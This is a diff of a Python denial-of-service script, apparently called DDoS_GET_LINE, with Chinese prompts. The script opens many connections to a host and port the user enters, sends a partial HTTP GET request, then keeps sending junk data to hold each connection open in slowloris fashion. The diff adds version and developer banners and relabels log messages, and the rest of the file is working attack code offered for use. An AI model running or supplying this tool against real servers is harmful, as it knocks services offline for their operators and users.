@@ -2,9 +2,14 @@ import socket
 import time
 import threading
 
+print("DDoS_GET_LINE版本：release-1.9.9")
+print("开发者：On-line")
+print("本软件在GitHub开源：https://github.com/lovepc-online/DDoS_GET_LINE")
+print("如果您付费购买，那么一定是被骗了！！！")
+
 MAX_CONN = int(input("请设置连接的数量："))  # 设置连接的数量
+HOST = input("请设置IPv4地址/网址：")  # 设置IP地址/域名
 PORT = int(input("请设置端口号："))  # 设置端口号
-HOST = input("请设置IP地址/域名，不支持IPv6！：")  # 设置IP地址/域名
 PAGE = "/DVWA"
 
 buf = ("GET %s HTTP/1.1\r\n"
@@ -22,10 +27,10 @@ def conn_thread():
         try:
             s.connect((HOST, PORT))
             s.send(bytes(buf, encoding='utf-8'))  # 发送HTTP请求
-            print("[+] Send buf OK!,conn=%d" % i)
+            print("[+] HTTP:Send buf OK!,conn=%d" % i)
             socks.append(s)
         except Exception as ex:
-            print("[-] Could not connect to server or send error:%s" % ex)
+            print("[-] HTTP:Could not connect to server or send error:%s" % ex)
             time.sleep(2)
 
 def send_thread():
@@ -34,9 +39,9 @@ def send_thread():
         for s in socks:
             try:
                 s.send(bytes("ddos", encoding='utf-8'))  # ddos攻击
-                print("[+] send OK!")
+                print("[+] DDoS:send OK!")
             except Exception as ex:
-                print("[-] send Exception:%s" % ex)
+                print("[-] DDoS:send Exception:%s" % ex)
                 socks.remove(s)
                 s.close()
         time.sleep(1)
